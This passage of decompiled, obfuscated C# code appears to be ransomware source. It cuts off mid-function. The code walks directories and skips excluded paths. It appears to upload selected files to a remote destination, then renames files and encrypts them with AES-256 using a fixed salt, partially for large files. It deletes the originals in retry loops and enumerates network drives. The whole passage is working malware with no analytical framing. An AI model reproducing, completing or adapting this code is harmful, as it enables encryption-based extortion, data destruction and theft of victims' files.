&& !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107397159)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407451)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(xTicVszXpILTir.getString_0(107407418)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(xTicVszXpILTir.getString_0(107407381)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(xTicVszXpILTir.getString_0(107407376)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(xTicVszXpILTir.getString_0(107407371)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(xTicVszXpILTir.getString_0(107407398)) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(kcoCbafUQcNu) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(KymHhFbNcwDYA) && !CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.Contains(DNnNiXPlebeA))
			{
				if (CS_0024_003C_003E8__locals0.AwSXDGKxLfSIbIc.Length != 0)
				{
					string[] awSXDGKxLfSIbIc = CS_0024_003C_003E8__locals0.AwSXDGKxLfSIbIc;
					int num = 0;
					while (num < awSXDGKxLfSIbIc.Length)
					{
						string value = awSXDGKxLfSIbIc[num];
						if (!CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.EndsWith(CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!usKuKFlfRGo.Contains(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR))
				{
					if (ernpBfXEaTaC == xTicVszXpILTir.getString_0(107396762))
					{
						try
						{
							if (sirjdslywbXhg.lbHjGrOeSMm(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR))
							{
								sirjdslywbXhg.lbgprBqnBBcnLiR(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
							}
						}
						catch
						{
						}
					}
					usKuKFlfRGo.Add(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
					if (!aJxBDYqKswV.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR)))
					{
						aJxBDYqKswV.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR));
					}
					JQZzLwKsZGVNU(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
					try
					{
						new aCpGquenmSFv().advpQeGLuA(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (IebLDrmorstxvf)
								{
									Console.WriteLine(xTicVszXpILTir.getString_0(107356571) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + xTicVszXpILTir.getString_0(107355982) + new FileInfo(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR).Length + xTicVszXpILTir.getString_0(107355993));
									Console.WriteLine(xTicVszXpILTir.getString_0(107355952));
								}
							}
							catch
							{
							}
							eZjDlpokwsIwI(UwCpksGCJZfb(xTicVszXpILTir.getString_0(107355879)), xTicVszXpILTir.getString_0(107407282) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + xTicVszXpILTir.getString_0(107407282) + UwCpksGCJZfb(xTicVszXpILTir.getString_0(107355822)) + xTicVszXpILTir.getString_0(107407282) + Environment.UserName + xTicVszXpILTir.getString_0(107407282) + UwCpksGCJZfb(xTicVszXpILTir.getString_0(107355837)));
						}
					}
					catch (Exception ex2)
					{
						if (LbhjvcCDDsZLYlccs)
						{
							try
							{
								File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + xTicVszXpILTir.getString_0(107355812) + ex2.Message + xTicVszXpILTir.getString_0(107396529));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (LbhjvcCDDsZLYlccs)
							{
								try
								{
									File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + xTicVszXpILTir.getString_0(107356211) + ex4.Message + xTicVszXpILTir.getString_0(107396529));
								}
								catch (Exception)
								{
								}
							}
							WfLfyuLvRnJc++;
							goto end_IL_085c_2;
						}
						if (zLetmNvKrIwT == xTicVszXpILTir.getString_0(107396762) && new FileInfo(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR).Length > Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD != xTicVszXpILTir.getString_0(107404777))
								{
									if (rCIcEDqTdpw)
									{
										CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD = gpxoAkpemIpRD + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD;
									}
									File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD);
								}
							}
							catch (Exception ex6)
							{
								if (LbhjvcCDDsZLYlccs)
								{
									try
									{
										File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + xTicVszXpILTir.getString_0(107356150) + ex6.Message + xTicVszXpILTir.getString_0(107396529));
									}
									catch (Exception)
									{
									}
								}
								WfLfyuLvRnJc++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD != xTicVszXpILTir.getString_0(107404777))
							{
								CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR += CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD;
							}
							if (wASqMXkPHKG == xTicVszXpILTir.getString_0(107396762))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in dYfpziNqSOobL)
									{
										if (CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.pvSBMBPwCxnGTc.pcXEMNCHXKbhD) && SNKStIUyCToW == xTicVszXpILTir.sQMPyEprCtcgxr.getString_0(107396768))
										{
											if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR).Length)
											{
												try
												{
													SYJrybFSgaPzO.JEuvJEKelGD(xTicVszXpILTir.sQMPyEprCtcgxr.getString_0(107408045), xTicVszXpILTir.sQMPyEprCtcgxr.getString_0(107408040), xTicVszXpILTir.sQMPyEprCtcgxr.getString_0(107408507), CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR.ToLower().EndsWith(item3) && SNKStIUyCToW == xTicVszXpILTir.sQMPyEprCtcgxr.getString_0(107397025))
										{
											try
											{
												SYJrybFSgaPzO.JEuvJEKelGD(xTicVszXpILTir.sQMPyEprCtcgxr.getString_0(107408045), xTicVszXpILTir.sQMPyEprCtcgxr.getString_0(107408040), xTicVszXpILTir.sQMPyEprCtcgxr.getString_0(107408507), CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = PedoVUYBDhwUQjvS.NlfnWjhcyWLLT(32);
							string text2 = xTicVszXpILTir.getString_0(107408438);
							text2 = (aeWIyHaDtadg ? PedoVUYBDhwUQjvS.wRFGskFNOCi() : xTicVszXpILTir.getString_0(107408438));
							string s = ooALNlRpqMWnp.oXJvdDupCCWESvWS(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (tmrMvaVtFfCS == xTicVszXpILTir.getString_0(107397019))
							{
								byte[] array = null;
								byte[] byte_ = NaRnXemgrEhEu.CfIULFaxXTze(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, Convert.ToInt32(vwHJGZSsQHuV) * 1024 * 1024);
								if (!NaRnXemgrEhEu.dyvfLRQwyjnq(NlACJGRWEHCA: (!vGfsNnNMtKaym) ? (aeWIyHaDtadg ? NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NaRnXemgrEhEu.vWTJMcrwiwmBiRL(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptBQsjxXVIiCd), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (aeWIyHaDtadg ? GpnnmMPrTtDBD.kAaFSjIASsxCjS(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : GpnnmMPrTtDBD.kAaFSjIASsxCjS(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.ptBQsjxXVIiCd), Convert.FromBase64String(heWrupMPBNsV))), CeNYFaLSDRX: CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, YSvPvJtuif: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!aeWIyHaDtadg)
							{
								if (!GwvItkvAvmqBoMs.bEpaIEDRMOENWhX(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, vwHJGZSsQHuV, CS_0024_003C_003E8__locals0.ptBQsjxXVIiCd, null, Convert.FromBase64String(heWrupMPBNsV)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!GwvItkvAvmqBoMs.bEpaIEDRMOENWhX(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, vwHJGZSsQHuV, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (rCIcEDqTdpw)
							{
								CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD = gpxoAkpemIpRD + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD;
							}
							string text3 = PedoVUYBDhwUQjvS.NlfnWjhcyWLLT(32);
							string text4 = xTicVszXpILTir.getString_0(107408438);
							text4 = (aeWIyHaDtadg ? PedoVUYBDhwUQjvS.wRFGskFNOCi() : xTicVszXpILTir.getString_0(107408438));
							string s2 = ooALNlRpqMWnp.oXJvdDupCCWESvWS(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD != xTicVszXpILTir.getString_0(107404777))
							{
								if (!YEiCwolccbrDJ)
								{
									if (!aeWIyHaDtadg)
									{
										FUeBmieOxgVOz(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, VROLwKjAIsul);
									}
									else
									{
										FUeBmieOxgVOz(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!aeWIyHaDtadg)
										{
											UhqvkICiuPON(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, VROLwKjAIsul, Convert.FromBase64String(heWrupMPBNsV));
										}
										else
										{
											UhqvkICiuPON(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (LbhjvcCDDsZLYlccs)
										{
											try
											{
												File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + xTicVszXpILTir.getString_0(107404795) + ex11.Message + xTicVszXpILTir.getString_0(107396529));
											}
											catch (Exception)
											{
											}
										}
										WfLfyuLvRnJc++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!YEiCwolccbrDJ)
							{
								if (!aeWIyHaDtadg)
								{
									FUeBmieOxgVOz(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + xTicVszXpILTir.getString_0(107404804), VROLwKjAIsul);
								}
								else
								{
									FUeBmieOxgVOz(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + xTicVszXpILTir.getString_0(107404804), Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!aeWIyHaDtadg)
									{
										UhqvkICiuPON(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, VROLwKjAIsul, Convert.FromBase64String(heWrupMPBNsV));
									}
									else
									{
										UhqvkICiuPON(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (LbhjvcCDDsZLYlccs)
									{
										try
										{
											File.AppendAllText(KymHhFbNcwDYA, xTicVszXpILTir.getString_0(107404539) + CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + xTicVszXpILTir.getString_0(107404795) + ex14.Message + xTicVszXpILTir.getString_0(107396529));
										}
										catch (Exception)
										{
										}
									}
									WfLfyuLvRnJc++;
									return;
								}
							}
							if (aeWIyHaDtadg)
							{
								if (CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD != xTicVszXpILTir.getString_0(107404777))
								{
									fowJyXOiDyhEY(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR + CS_0024_003C_003E8__locals0.pcXEMNCHXKbhD, bytes2);
								}
								else
								{
									fowJyXOiDyhEY(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1069;
			IL_1069:
			CS_0024_003C_003E8__locals0.dicUQzGeuGgAYU.Remove(CS_0024_003C_003E8__locals0.hGIXrOjCnxEmIR);
		});
	}

	private static void CUOXqCgsApZEFY(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (wASqMXkPHKG == getString_0(107396742))
					{
						foreach (string item in dYfpziNqSOobL)
						{
							if (string_0.ToLower().EndsWith(item) && SNKStIUyCToW == getString_0(107396742))
							{
								if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408019), getString_0(107408014), getString_0(107408481), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && SNKStIUyCToW == getString_0(107396999))
							{
								try
								{
									SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408019), getString_0(107408014), getString_0(107408481), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107404784)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107404784), getString_0(107408418)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void UhqvkICiuPON(string lcMcYjwxyasXZ, string OvrEgjZzof, byte[] hEFSEXXQtQk, byte[] HkKSYZpChEpRno = null)
	{
		try
		{
			if (wASqMXkPHKG == getString_0(107396742))
			{
				FileStream fileStream = new FileStream(lcMcYjwxyasXZ, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in dYfpziNqSOobL)
				{
					if (lcMcYjwxyasXZ.ToLower().EndsWith(item) && SNKStIUyCToW == getString_0(107396742))
					{
						if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408019), getString_0(107408014), getString_0(107408481), lcMcYjwxyasXZ);
							}
							catch
							{
							}
						}
					}
					else if (lcMcYjwxyasXZ.ToLower().EndsWith(item) && SNKStIUyCToW == getString_0(107396999))
					{
						try
						{
							SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408019), getString_0(107408014), getString_0(107408481), lcMcYjwxyasXZ);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (lcMcYjwxyasXZ != OvrEgjZzof)
		{
			File.Move(lcMcYjwxyasXZ, OvrEgjZzof);
			lcMcYjwxyasXZ = OvrEgjZzof;
		}
		byte[] bytes = GpnnmMPrTtDBD.kAaFSjIASsxCjS(File.ReadAllBytes(lcMcYjwxyasXZ), hEFSEXXQtQk, HkKSYZpChEpRno);
		File.WriteAllBytes(lcMcYjwxyasXZ, bytes);
		FqOxBTVEHuVPbA++;
	}

	private static void FUeBmieOxgVOz(string string_0, string string_1, byte[] byte_0)
	{
		OMCAJwLkqgm CS_0024_003C_003E8__locals0 = new OMCAJwLkqgm();
		CS_0024_003C_003E8__locals0.CPizXigAwuri = string_0;
		CS_0024_003C_003E8__locals0.fdrqxYITdZZrNp = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string fdrqxYITdZZrNp = CS_0024_003C_003E8__locals0.fdrqxYITdZZrNp;
			FileStream fileStream = new FileStream(fdrqxYITdZZrNp, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (VvUkitdKffw == getString_0(107396742))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.CPizXigAwuri, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.CPizXigAwuri, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.CPizXigAwuri, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.fdrqxYITdZZrNp.Length > 0)
				{
					if (wASqMXkPHKG == getString_0(107396742))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.CPizXigAwuri, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in dYfpziNqSOobL)
						{
							if (CS_0024_003C_003E8__locals0.CPizXigAwuri.ToLower().EndsWith(item) && SNKStIUyCToW == getString_0(107396742))
							{
								if (Convert.ToInt32(uQaSKuiUmt) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408019), getString_0(107408014), getString_0(107408481), CS_0024_003C_003E8__locals0.CPizXigAwuri);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.CPizXigAwuri.ToLower().EndsWith(item) && SNKStIUyCToW == getString_0(107396999))
							{
								try
								{
									SYJrybFSgaPzO.JEuvJEKelGD(getString_0(107408019), getString_0(107408014), getString_0(107408481), CS_0024_003C_003E8__locals0.CPizXigAwuri);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.CPizXigAwuri);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.fdrqxYITdZZrNp.EndsWith(getString_0(107404784)))
					{
						File.Move(CS_0024_003C_003E8__locals0.fdrqxYITdZZrNp, CS_0024_003C_003E8__locals0.fdrqxYITdZZrNp.Replace(getString_0(107404784), getString_0(107408418)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.fdrqxYITdZZrNp))
							{
								File.Delete(CS_0024_003C_003E8__locals0.fdrqxYITdZZrNp);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (LbhjvcCDDsZLYlccs)
			{
				try
				{
					File.AppendAllText(KymHhFbNcwDYA, getString_0(107404519) + CS_0024_003C_003E8__locals0.CPizXigAwuri + getString_0(107404775) + ex2.Message + getString_0(107396509));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__7()
	{
		List<string> source = mdyFThwFRBOHoa;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
			{
				eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404722)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		List<string> gCrSVISOUVr = GCrSVISOUVr;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404709)), string_0);
			};
		}
		Parallel.ForEach(gCrSVISOUVr, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		if (rWztVQEavHzyaEvX == getString_0(107396742))
		{
			string[] jwhxWOIlqyyGA = JwhxWOIlqyyGA;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
				{
					eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404709)), getString_0(107404684) + string_0 + getString_0(107404131));
				};
			}
			Parallel.ForEach(jwhxWOIlqyyGA, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		}
		if (!GzujaRTNkzjcu().Contains(getString_0(107404865)))
		{
			QcdyUTbkpEHyhuof(WfYMtHvcWdVLkR);
		}
		else
		{
			List<string> source2 = ikpbUcWXzcxbZ;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
				{
					eZjDlpokwsIwI(UwCpksGCJZfb(krZwaVuuJwBahD(getString_0(107404126))), string_0);
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		}
		List<string> source3 = uSjNOsTsmigYN;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404133)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404722)), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404709)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404709)), getString_0(107404684) + string_0 + getString_0(107404131));
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		eZjDlpokwsIwI(UwCpksGCJZfb(krZwaVuuJwBahD(getString_0(107404126))), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		eZjDlpokwsIwI(UwCpksGCJZfb(getString_0(107404133)), string_0);
	}

	private static void _003CMapDrv_003Eb__19(string string_0)
	{
		diMjuCNLxzH CS_0024_003C_003E8__locals0 = new diMjuCNLxzH();
		CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA = string_0;
		if ((!CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA.StartsWith(getString_0(107404084)) && !CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA.StartsWith(getString_0(107404111)) && !CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA.StartsWith(getString_0(107404102)) && !CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA.StartsWith(getString_0(107408418))) || !cyikEDwiTbqA.UjKDIhJqGQpCr(CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA))
		{
			return;
		}
		try
		{
			Thread.Sleep(SlKkhSsDvLYM);
			OtDxRoGRan.Add(getString_0(107407308) + CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA + getString_0(107404057));
			try
			{
				if (IebLDrmorstxvf)
				{
					Console.WriteLine(getString_0(107407308) + CS_0024_003C_003E8__locals0.MOTThDWSWHsZUTLLA + getString_0(107404057));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
